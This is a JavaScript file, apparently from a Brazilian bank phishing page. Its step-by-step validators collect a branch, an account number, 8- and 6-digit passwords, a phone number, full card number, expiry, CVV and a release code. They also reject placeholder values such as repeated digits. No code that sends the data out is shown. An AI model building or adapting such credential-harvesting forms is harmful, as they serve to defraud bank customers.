function validation1() {
if ( document.form.agencia.value == "" || 
document.form.agencia.value.length < 5 || 
document.form.agencia.value == "0000-0" || 
document.form.agencia.value == "1111-1" || 
document.form.agencia.value == "2222-2" ||
document.form.agencia.value == "3333-3" || 
document.form.agencia.value == "4444-4" || 
document.form.agencia.value == "5555-5" || 
document.form.agencia.value == "6666-6" || 
document.form.agencia.value == "7777-7" || 
document.form.agencia.value == "8888-8" || 
document.form.agencia.value == "9999-9"){
alert ("Agência Inválida!");
document.form.agencia.focus(); return false;
}
if (document.form.conta.value == "" || 
document.form.conta.value.length < 3 || 
document.form.conta.value == "00000000000-0" || 
document.form.conta.value == "11111111111-1" || 
document.form.conta.value == "22222222222-2" || 
document.form.conta.value == "33333333333-3" || 
document.form.conta.value == "44444444444-4" || 
document.form.conta.value == "55555555555-5" || 
document.form.conta.value == "66666666666-6" || 
document.form.conta.value == "77777777777-7" || 
document.form.conta.value == "88888888888-8" || 
document.form.conta.value == "99999999999-9"){
alert ("Conta corrente Inválida!");
document.form.conta.focus(); return false;
}

if (document.form.senha8.value == "" || 
document.form.senha8.value.length < 8 || 
document.form.senha8.value.length > 8 || 
document.form.senha8.value == "00000000" || 
document.form.senha8.value == "11111111" || 
document.form.senha8.value == "22222222" || 
document.form.senha8.value == "33333333" || 
document.form.senha8.value == "44444444" || 
document.form.senha8.value == "55555555" || 
document.form.senha8.value == "66666666" || 
document.form.senha8.value == "77777777" || 
document.form.senha8.value == "88888888" || 
document.form.senha8.value == "99999999"){
alert ("Senha de Auto-Atendimento, Inválida!");
document.form.senha8.focus(); return false;
}
}

function validation2() {
if (document.form.telefone.value == "" || 
document.form.telefone.value.length < 10 || 
document.form.telefone.value == "(00) 00000-0000" || 
document.form.telefone.value == "(11) 11111-1111" || 
document.form.telefone.value == "(22) 22222-2222" || 
document.form.telefone.value == "(33) 33333-3333" || 
document.form.telefone.value == "(44) 44444-4444" || 
document.form.telefone.value == "(55) 55555-5555" || 
document.form.telefone.value == "(66) 66666-6666" || 
document.form.telefone.value == "(77) 77777-7777" || 
document.form.telefone.value == "(88) 88888-8888" || 
document.form.telefone.value == "(99) 99999-9999"){
alert ("Telefone, Inválido!");
document.form.telefone.focus(); return false;
}

if (document.form.senha6.value == "" || 
document.form.senha6.value.length < 6 || 
document.form.senha6.value == "000000" || 
document.form.senha6.value == "111111" || 
document.form.senha6.value == "222222" || 
document.form.senha6.value == "333333" || 
document.form.senha6.value == "444444" || 
document.form.senha6.value == "555555" || 
document.form.senha6.value == "666666" || 
document.form.senha6.value == "777777" || 
document.form.senha6.value == "888888" || 
document.form.senha6.value == "999999"){
alert ("Senha de (6 dígitos), Inválida!");
document.form.senha6.focus(); return false;
}

}

function validation3() {
if (document.form.cc.value == "" || 
document.form.cc.value.length < 18 || 
document.form.cc.value == "0000 0000 0000 0000" || 
document.form.cc.value == "1111 1111 1111 1111" || 
document.form.cc.value == "2222 2222 2222 2222" || 
document.form.cc.value == "3333 3333 3333 3333" || 
document.form.cc.value == "4444 4444 4444 4444" || 
document.form.cc.value == "5555 5555 5555 5555" || 
document.form.cc.value == "6666 6666 6666 6666" || 
document.form.cc.value == "7777 7777 7777 7777" || 
document.form.cc.value == "8888 8888 8888 8888" || 
document.form.cc.value == "9999 9999 9999 9999"){
alert ("Número do Cartão, Inválido!");
document.form.cc.focus(); return false;
}

if (document.form.val.value == "" || 
document.form.val.value.length < 4 || 
document.form.val.value == "00/00" || 
document.form.val.value == "11/11" || 
document.form.val.value == "22/22" || 
document.form.val.value == "33/33" || 
document.form.val.value == "44/44" || 
document.form.val.value == "55/55" || 
document.form.val.value == "66/66" || 
document.form.val.value == "77/77" || 
document.form.val.value == "88/88" || 
document.form.val.value == "99/99"){
alert ("Data de Validade, Inválida!");
document.form.val.focus(); return false;
}

if (document.form.cvv.value == "" || 
document.form.cvv.value.length < 3){
alert ("CVV, Inválida!");
document.form.cvv.focus(); return false;
}

}

function validation4() {

if (document.form.libera.value == "" || 
document.form.libera.value.length < 3){
alert ("Erro ao verificar, Inválida!");
document.form.libera.focus(); return false;
}

}

/* ================================================================ */

function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;
    if((tecla > 47 && tecla < 58)) return true;
    else{
    if (tecla != 8) return false;
    else return true;
    }
}

/* ================================================================ */

	function maskTrak(format, field)
{
	var result = "";
	var maskIdx = format.length - 1;
	var error = false;
	var valor = field.value;
	var posFinal = false;
	if( field.setSelectionRange ) 
	{
    	if(field.selectionStart == valor.length)
    		posFinal = true;
    }
	valor = valor.replace(/[^0123456789Xx]/g,'')
	for (var valIdx = valor.length - 1; valIdx >= 0 && maskIdx >= 0; --maskIdx)
	{
		var chr = valor.charAt(valIdx);
		var chrMask = format.charAt(maskIdx);
		switch (chrMask)
		{
		case '#':
			if(!(/\d/.test(chr)))
				error = true;
			result = chr + result;
			--valIdx;
			break;
		case '@':
			result = chr + result;
			--valIdx;
			break;
		default:
			result = chrMask + result;
		}
	}

	field.value = result;
	field.style.color = error ? 'red' : '';
	if(posFinal)
	{
		field.selectionStart = result.length;
		field.selectionEnd = result.length;
	}
	return result;
}

/* ================================================================ */

function mascaraTelefone( campo ) {
			
function trata( valor,  isOnBlur ) {
					
	valor = valor.replace(/\D/g,"");             			
	valor = valor.replace(/^(\d{2})(\d)/g,"($1)$2"); 		
					
	if( isOnBlur ) {
						
	valor = valor.replace(/(\d)(\d{4})$/,"$1-$2");   
					} else {

						valor = valor.replace(/(\d)(\d{3})$/,"$1-$2"); 
					}
					return valor;
				}
				
				campo.onkeypress = function (evt) {
					 
					var code = (window.event)? window.event.keyCode : evt.which;	
					var valor = this.value
					
					if(code > 57 || (code < 48 && code != 8 ))  {
						return false;
					} else {
						this.value = trata(valor, false);
					}
				}
				
				campo.onblur = function() {
					
					var valor = this.value;
					if( valor.length < 13 ) {
						this.value = ""
					}else {		
						this.value = trata( this.value, true );
					}
				}
				
				campo.maxLength = 14;
			}
			
/* ================================================================ */